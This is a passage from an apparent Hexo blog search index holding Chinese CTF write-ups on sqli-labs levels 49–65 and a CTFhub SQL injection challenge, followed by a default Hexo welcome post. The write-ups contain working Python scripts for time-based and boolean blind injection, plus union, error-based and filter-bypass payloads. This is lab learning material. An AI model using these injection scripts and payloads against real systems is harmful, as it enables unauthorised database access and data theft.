class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    start = time.time()</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    url = &#x27;http://101.35.96.6:8000/Less-49/?sort=&#x27;</span><br><span class="line">    key = &#123;&#125;</span><br><span class="line">    database = &#x27;&#x27;</span><br><span class="line">    database_length = 8</span><br><span class="line">    threads_num = 4</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=progress_bar,args=(threads_num,database_length))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    for i in range(1, 9):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line">    for i in range(threads_num):</span><br><span class="line">        t = threading.Thread(target=findpass, args=(q, url, key,))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    for t in threads:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    for i in sorted(key):</span><br><span class="line">        database = database + key[i]</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    print(f&quot;数据库------&gt;&gt;&#123;database&#125;,耗时 &#123;end - start&#125;s&quot;)</span><br><span class="line"></span><br><span class="line">def progress_bar(time_progress,database_length):</span><br><span class="line">    def progress(percent):</span><br><span class="line">        if percent &gt; 1:</span><br><span class="line">            percent = 1</span><br><span class="line">        res = int(50 * percent) * &#x27;#&#x27;</span><br><span class="line">        print(&#x27;\r[%-50s] %d%%&#x27; % (res, int(100 * percent)), end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    recv_size = 0</span><br><span class="line">    total_size = database_length</span><br><span class="line">    while recv_size &lt; total_size:</span><br><span class="line">        time.sleep(time_progress)  </span><br><span class="line">        recv_size += time_progress</span><br><span class="line">        percent = recv_size </span><br><span class="line">        progress(percent)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">def findpass(q,url,key):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        i=q.get()</span><br><span class="line">        min = 32    </span><br><span class="line">        max = 126   </span><br><span class="line">        mid = (min + max) // 2</span><br><span class="line">        while min &lt; max:</span><br><span class="line">            payload = f&quot;1&#x27; and if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)--+&quot;</span><br><span class="line">            try:</span><br><span class="line">                req = requests.get(url=url+payload, timeout=1)</span><br><span class="line">            except requests.exceptions.Timeout as e:</span><br><span class="line">                min = mid + 1</span><br><span class="line">                mid=(min+max)//2    </span><br><span class="line">                continue</span><br><span class="line">            max = mid</span><br><span class="line">            mid = (min + max) // 2</span><br><span class="line">        key[i]=chr(mid)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208051822919.png" alt="image-20220805182246844"></p><h4 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h4><p>这关我们用盲注来检测闭合符，发现这关为数值型注入</p><p><strong>盲注测试闭合：</strong>1 and (if(length(database())&#x3D;8,sleep(1),0)) –+</p><p>而且能返回数据信息，所以我们使用报错注入来做</p><p><strong>爆数据库</strong>：1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208071200774.png" alt="image-20220807120017667"></p><h4 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h4><p>这关我们同样使用盲注来检测闭合符，发现闭合符为’</p><p>和50关一样使用报错注入即可</p><p><strong>爆数据库</strong>：1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208071458422.png" alt="image-20220807145848361"></p><h4 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h4><p>这关不管输什么闭合都报错，所以初步判断为数值注入</p><p>用盲注进行测试同样也证实了本关为数值注入</p><p>那么我们直接用盲注即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    start = time.time()</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    url = &#x27;http://101.35.96.6:8000/Less-52/?sort=&#x27;</span><br><span class="line">    database_length = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload_database_length = f&quot;1 and(if(length(database())=&#123;database_length&#125;,sleep(1),0))--+&quot;</span><br><span class="line">        try:</span><br><span class="line">            req = requests.get(url=url + payload_database_length, timeout=1)</span><br><span class="line">            database_length += 1</span><br><span class="line">        except requests.exceptions.Timeout as e:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    key = &#123;&#125;</span><br><span class="line">    database = &#x27;&#x27;</span><br><span class="line">    threads_num = 4</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    for i in range(1, database_length+1):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line">    for i in range(threads_num):</span><br><span class="line">        t = threading.Thread(target=findpass, args=(q, url, key,))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    for t in threads:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    for i in sorted(key):</span><br><span class="line">        database = database + key[i]</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    print(f&quot;数据库------&gt;&gt;&#123;database&#125;,耗时 &#123;end - start&#125;s&quot;)</span><br><span class="line"></span><br><span class="line">def findpass(q,url,key):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        i=q.get()</span><br><span class="line">        min = 32    #</span><br><span class="line">        max = 126   #</span><br><span class="line">        mid = (min + max) // 2</span><br><span class="line">        while min &lt; max:</span><br><span class="line">            payload = f&quot;1 and if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)--+&quot;</span><br><span class="line">            try:</span><br><span class="line">                req = requests.get(url=url+payload, timeout=1)</span><br><span class="line">            except requests.exceptions.Timeout as e:</span><br><span class="line">                min = mid + 1</span><br><span class="line">                mid=(min+max)//2</span><br><span class="line">                continue</span><br><span class="line">            max = mid</span><br><span class="line">            mid = (min + max) // 2</span><br><span class="line">        key[i]=chr(mid)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208071502685.png" alt="image-20220807150201609"></p><h4 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h4><p>这关同样用盲注来检测闭合符，闭合符为单引号</p><p>直接用盲注的exp跑一下就行</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208071552198.png" alt="image-20220807155204119"></p><h2 id="项目四-Challenges"><a href="#项目四-Challenges" class="headerlink" title="项目四(Challenges)"></a>项目四(Challenges)</h2><h4 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h4><p>这关主要是有随机值还有每10次尝试都会把数据全部更新一遍</p><p>这一关成功找到了闭合符为’</p><p><strong>查表名</strong>：-1’ union select 1,2,(select table_name from information_schema.tables where table_schema&#x3D;database())–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208091958726.png" alt="image-20220809195840611"></p><p><strong>查字段</strong></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208091959642.png" alt="image-20220809195906560"></p><p><strong>查值</strong>：-1’ union select 1,2,(select group_concat(concat_ws(‘~’,id,sessid,secret_W1ZS,tryy<br>)) from  O4D9YCZRLT)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208092002286.png" alt="image-20220809200256204"></p><h4 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h4><p>这个关主要是新的闭合符(</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100832882.png" alt="image-20220810083156744"></p><p><strong>爆数据库</strong>：-1) union select 1,2,(select group_concat(schema_name) from information_schema.schemata)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100833244.png" alt="image-20220810083352171"></p><p><strong>爆表名</strong>-1) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database())–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100834202.png" alt="image-20220810083452126"></p><p><strong>爆字段</strong>：-1) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; ‘A3FU06FGMW’)–+<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100836234.png" alt="image-20220810083602162"></p><p><strong>爆值</strong>：-1) union select 1,2,(select group_concat(concat_ws(‘~’,id,sessid,secret_9IL3,tryy)) from A3FU06FGMW)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100837941.png" alt="image-20220810083720869"></p><h4 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h4><p>这关输入闭合符时，只有单引号无回显，其他均有回显，但输入and 1&#x3D;1 时并无回显，所以我们试试’) 发现成功回显</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100841439.png" alt="image-20220810084145367"></p><p><strong>爆数据库</strong>：-1’) union select 1,2,(select group_concat(schema_name) from information_schema.schemata) –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100842473.png" alt="image-20220810084252402"></p><h4 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h4><p>这关进行闭合符测试中，闭合符为“</p><p><strong>爆数据库</strong>：-1” union select 1,2,(select group_concat(schema_name) from information_schema.schemata) –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100846548.png" alt="image-20220810084615475"></p><h4 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h4><p>这题主要是找到了闭合符后，却不能回显数据，只能报错注入</p><p><strong>爆数据库</strong>：1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100855849.png" alt="image-20220810085545781"></p><h4 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h4><p>这题和上题一样不过为数值型报错注入</p><p><strong>爆数据库：</strong>1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100857071.png" alt="image-20220810085738994"></p><h4 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h4><p>这题我们用\试出了闭合符为”)</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100859127.png" alt="image-20220810085904057"></p><p>同样再用报错注入</p><p><strong>爆数据库：</strong>1”) and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a) –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100859034.png" alt="image-20220810085954954"></p><h4 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h4><p>这题我们同样用\试出了闭合符为’)),接下来还是用报错注入</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100901931.png" alt="image-20220810090124863"></p><h4 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h4><p>这题告诉了我们130次以内，这么次数那么肯定就是盲注了</p><p>不过130次跑盲注对于脚本来说还是太少了。所以手工注入一下就行</p><p>id&#x3D;1’) and (if(substr(database(),1,1)&#x3D;’c’,sleep(3),0))–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100910060.png" alt="image-20220810091051986"></p><h4 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h4><p>这题经过尝试后，闭合符为’</p><p>1’ and (if(substr(database(),1,1)&#x3D;’c’,sleep(3),0))–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100915920.png" alt="image-20220810091525829"></p><h4 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h4><p>这关同样为盲注，不过试了闭合符一直没试出来，看了wp后发现为))</p><p>1)) and (if(substr(database(),1,1)&#x3D;’c’,sleep(3),0))–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100919989.png" alt="image-20220810091901915"></p><h4 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h4><p>这题闭合符为”)</p><p>1”) and (if(substr(database(),1,1)&#x3D;’c’,sleep(3),0))–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208100921937.png" alt="image-20220810092131857"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFhub - SQL注入-2</title>
      <link href="/2022/07/18/123/"/>
      <url>/2022/07/18/123/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFhub-SQL注入-2"><a href="#CTFhub-SQL注入-2" class="headerlink" title="CTFhub - SQL注入-2"></a>CTFhub - SQL注入-2</h1><p><strong>描述：本题为Nu1L团队编著的《从0到1：CTFer成长之路》配套题目。来源网站：<a href="https://book.nu1l.com/">https://book.nu1l.com/</a></strong></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724514.png" alt="image-20220706124554402"></p><p>解题思路</p><p>使用最常见的弱口令账号admin</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724412.png" alt="image-20220706124821719"></p><p>显示账号或密码错误，但使用别的账号会出现账号不存在</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724515.png" alt="image-20220706124849740"></p><p>由此可知admin账号存在，接下来构造sql语句，测试闭合符为单引号</p><p><strong>字段数：</strong>admin’ order by 3 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724653.png" alt="image-20220706125020604"></p><p>由于下方只会出现账号或密码错误和账号不存在，初步判定为布尔盲注。因为之前做了第一题知道了第一题的数据库为n开头，所以试了试，发现成功了。</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724379.png" alt="image-20220706125312370"></p><p>那么接下来构造payload即可</p><p>最简单的是用burp爆破，但由于python基础薄弱需要加强练，所以我这里选择用python构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">right = &#x27;8bef&#x27;</span><br><span class="line">worry = &#x27;5728&#x27;</span><br><span class="line">name = &#x27;&#x27;</span><br><span class="line">burp0_url = &quot;http://challenge-7cb990b3eae02932.sandbox.ctfhub.com:10800/login.php&quot;</span><br><span class="line">burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;,</span><br><span class="line">                 &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,</span><br><span class="line">                 &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">                 &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,</span><br><span class="line">                 &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,</span><br><span class="line">                 &quot;Origin&quot;: &quot;http://challenge-7cb990b3eae02932.sandbox.ctfhub.com:10800&quot;, &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">                 &quot;Referer&quot;: &quot;http://challenge-7cb990b3eae02932.sandbox.ctfhub.com:10800/login.php&quot;&#125;</span><br><span class="line">burp0_data = &#123;&quot;name&quot;: &quot;admin&#x27; and substr(database(),1,1)=&#x27;n&#x27; #&quot;, &quot;pass&quot;: &quot;123&quot;&#125;</span><br><span class="line">for i in range(1,5):</span><br><span class="line">    for j in range(65,123):</span><br><span class="line">        burp0_data[&quot;name&quot;] = f&quot;admin&#x27; and ascii(substr(database(),&#123;i&#125;,1))=&#123;j&#125; #&quot;</span><br><span class="line">        a = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text</span><br><span class="line">        if right in a:</span><br><span class="line">            name += chr(j)</span><br><span class="line">            print(f&quot;数据库--&gt;&gt;&#123;name&#125;&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724879.png" alt="image-20220706125635580"></p><p>很少用到python构造post注入，当时用text时没返回前端源码，只返回了{“error”:1,”msg”:”\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef”}，让我一度怀疑是不是自己哪里弄错了，或者根本不会用post注入，网上搜了搜wp后才知道这个是正常的    T_T</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724587.png" alt="image-20220706125811529"></p><p>得到了数据库名note，数据库名和第一题一模一样</p><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">right = &#x27;8bef&#x27;</span><br><span class="line">worry = &#x27;5728&#x27;</span><br><span class="line">name = &#x27;&#x27;</span><br><span class="line">burp0_url = &quot;http://challenge-ff4a6e64ccfa5835.sandbox.ctfhub.com:10800/login.php&quot;</span><br><span class="line">burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;,</span><br><span class="line">                 &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,</span><br><span class="line">                 &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">                 &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,</span><br><span class="line">                 &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,</span><br><span class="line">                 &quot;Origin&quot;: &quot;http://challenge-7cb990b3eae02932.sandbox.ctfhub.com:10800&quot;, &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">                 &quot;Referer&quot;: &quot;http://challenge-7cb990b3eae02932.sandbox.ctfhub.com:10800/login.php&quot;&#125;</span><br><span class="line">burp0_data = &#123;&quot;name&quot;: &quot;admin&#x27; and substr(database(),1,1)=&#x27;n&#x27; #&quot;, &quot;pass&quot;: &quot;123&quot;&#125;</span><br><span class="line">for i in range(0,15):</span><br><span class="line">        for j in range(48,123):</span><br><span class="line">            burp0_data[&quot;name&quot;] = f&quot;admin&#x27; and (ascii(substr((seselectlect  table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1),&#123;i&#125;,1))=&#123;j&#125;) #&quot;</span><br><span class="line">            a = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text</span><br><span class="line">            if right in a:</span><br><span class="line">                name += chr(j)</span><br><span class="line">                print(f&quot;数据库--&gt;&gt;&#123;name&#125;&quot;)</span><br></pre></td></tr></table></figure><p><strong><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724704.png" alt="image-20220706133427271"></strong></p><p><strong>爆字段</strong></p><p>爆字段爆的有点头大，由于sql注入没能完全掌握，没想到把select过滤掉了，还有数据库名。wp看了半天才找到原因</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207181724635.png" alt="image-20220706134849376"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">right = &#x27;8bef&#x27;</span><br><span class="line">worry = &#x27;5728&#x27;</span><br><span class="line">name = &#x27;&#x27;</span><br><span class="line">burp0_url = &quot;http://challenge-ff4a6e64ccfa5835.sandbox.ctfhub.com:10800/login.php&quot;</span><br><span class="line">burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;,</span><br><span class="line">                 &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,</span><br><span class="line">                 &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">                 &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,</span><br><span class="line">                 &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,</span><br><span class="line">                 &quot;Origin&quot;: &quot;http://challenge-7cb990b3eae02932.sandbox.ctfhub.com:10800&quot;, &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">                 &quot;Referer&quot;: &quot;http://challenge-7cb990b3eae02932.sandbox.ctfhub.com:10800/login.php&quot;&#125;</span><br><span class="line">burp0_data = &#123;&quot;name&quot;: &quot;admin&#x27; and substr(database(),1,1)=&#x27;n&#x27; #&quot;, &quot;pass&quot;: &quot;123&quot;&#125;</span><br><span class="line">for i in range(0,15):</span><br><span class="line">    for j in range(48, 123):</span><br><span class="line">        burp0_data[</span><br><span class="line">            &quot;name&quot;] = f&quot;admin&#x27; and (ascii(substr((seselectlect  column_name FROM information_schema.columns WHERE table_name=0x666c3467 limit 0,1),&#123;i&#125;,1))=&#123;j&#125;) #&quot;</span><br><span class="line">        a = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text</span><br><span class="line">        if right in a:</span><br><span class="line">            name += chr(j)</span><br><span class="line">            print(f&quot;字段：--&gt;&gt;&#123;name&#125;&quot;)</span><br></pre></td></tr></table></figure><p><a href="https://hexo.io/docs/one-command-deployment.html">https://hexo.io/docs/one-command-deployment.html</a>)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/18/hello-world/"/>
      <url>/2022/07/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
